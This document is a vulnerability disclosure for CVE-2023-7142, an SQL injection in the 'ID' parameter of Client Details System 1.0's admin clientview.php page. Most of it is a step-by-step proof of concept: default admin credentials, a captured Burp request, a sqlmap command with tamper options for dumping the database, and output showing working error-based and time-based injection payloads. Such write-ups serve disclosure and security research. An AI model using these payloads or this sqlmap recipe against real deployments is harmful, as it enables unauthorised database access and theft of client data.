# CVE-2023-7142_Client_Details_System-SQL_Injection_6
+ **Exploit Title:** CVE-2023-7142_Client_Details_System-SQL_Injection_6
+ **Date:** 2023-26-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/client-details-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/CLIENT_DETAILS_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7142

## References: 
+ **CVE-2023-7142:** https://vuldb.com/?id.249145
+ https://www.cve.org/CVERecord?id=CVE-2023-7142
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7142
+ https://nvd.nist.gov/vuln/detail/CVE-2023-7142

## Description:
Client Details System 1.0 allows SQL Injection via parameter 'ID' in "/clientdetails/admin/clientview.php?ID=2". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the Admin Panel: "http://localhost/clientdetails/admin/"
+ Fill User Id and Password with `admin`:`client123` and log in.
+ Client Details: "http://localhost/clientdetails/admin/clientview.php"
+ Then select the any client.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Captured Burp request:
```
GET /clientdetails/admin/clientview.php?ID=2 HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=p5mgq2eci66sik6s94eakcjub9
Referer: http://localhost/clientdetails/admin/clientview.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

```

+ Use sqlmap to exploit. In sqlmap, use 'ID' parameter to dump the database. 
```
python sqlmap.py -r r.txt -p ID --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: ID (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: ID=2' AND EXTRACTVALUE(9984,CONCAT(0x5c,0x7170706b71,(SELECT (ELT(9984=9984,1))),0x71766b6b71))-- TRvU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ID=2' AND (SELECT 4084 FROM (SELECT(SLEEP(5)))ERbG)-- puQq
---
[18:03:35] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.53, PHP 8.1.6
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:03:35] [INFO] fetching current database
[18:03:35] [INFO] retrieved: 'loginsystem'
current database: 'loginsystem'
```

+ current database: `loginsystem`
![6](https://github.com/h4md153v63n/CVEs/assets/5091265/e4e81845-617f-4d1b-9c1d-b4bae4f5fc73)
